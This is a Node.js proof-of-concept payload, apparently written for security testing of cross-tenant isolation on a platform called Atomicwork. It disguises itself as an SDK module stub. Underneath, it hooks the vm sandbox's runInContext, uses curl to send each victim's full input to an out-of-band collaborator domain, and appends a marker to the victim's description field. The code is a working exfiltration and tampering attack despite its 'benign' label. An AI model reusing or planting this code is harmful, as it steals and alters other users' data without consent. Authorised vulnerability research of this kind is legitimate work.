// Benign cross-tenant PoC payload. No Atomicwork source or credentials.
// Proof: appends a marker to the victim's description (real text stays intact) and exfiltrates
// the victim's full input to a collaborator.
const vm = require('vm');
const { execSync } = require('child_process');

const OOB_HOST = '233rxlncf2eftvib76v7ch2y6pcg0d31s.oastify.com';
const MARKER = ' [XTENANT-LEAK-CONFIRMED]';

function safe(v) {
  try { return JSON.parse(JSON.stringify(v)); } catch (e) { return String(v); }
}

function exfil(label, obj) {
  try {
    const body = JSON.stringify({ label: label, data: safe(obj) });
    execSync(
      'curl -s -m 8 -X POST -H "Content-Type: application/json" --data-binary @- ' +
        'https://' + OOB_HOST + '/x/' + label,
      { input: body, timeout: 9000, stdio: ['pipe', 'ignore', 'ignore'] }
    );
  } catch (e) { /* never break the invocation */ }
}

try {
  const origRun = vm.Script.prototype.runInContext;
  vm.Script.prototype.runInContext = function (ctx) {
    try {
      exfil('pre-run', { input: ctx ? ctx.input : null });
    } catch (e) {}
    try {
      if (ctx && ctx.input && ctx.input.default && ctx.input.default.description) {
        ctx.input.default.description = ctx.input.default.description + MARKER;
      }
    } catch (e) {}
    return origRun.apply(this, arguments);
  };
} catch (e) {}

module.exports = {
  SERVERS: [],
  createSDK: function () {
    return { runtime: { configureAPIClient: function () {} }, MCP: {}, API: {} };
  },
  destroySDK: function () { return Promise.resolve(); }
};
